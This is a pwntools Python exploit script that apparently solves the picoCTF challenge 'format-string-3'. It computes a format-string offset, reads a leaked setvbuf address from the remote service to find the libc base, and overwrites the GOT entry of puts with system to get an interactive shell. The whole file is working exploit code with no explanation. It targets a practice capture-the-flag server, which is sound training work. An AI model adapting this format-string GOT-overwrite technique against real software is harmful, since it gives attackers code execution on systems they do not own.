#!/bin/python3

from pwn import *

context.arch = "amd64"
elf = context.binary = ELF('./format-string-3')
libc = ELF("./libc.so.6")

def send_payload(payload):
    p = elf.process()
    p.sendline(payload)
    return p.recvall()

offset = FmtStr(send_payload).offset
info("offset = %d", offset)

# p = elf.process()
p = remote('rhea.picoctf.net', 59419)

p.recvuntil(b':')
setvbuf_leak = int(p.recvuntil(b'\n', drop=True).decode(), 16)

libc.address = setvbuf_leak - libc.symbols['setvbuf']

sys_addr = libc.symbols['system']
puts_addr = elf.got['puts']

payload = fmtstr_payload(offset, {puts_addr: sys_addr}, write_size="short")
p.sendline(payload)
p.interactive()
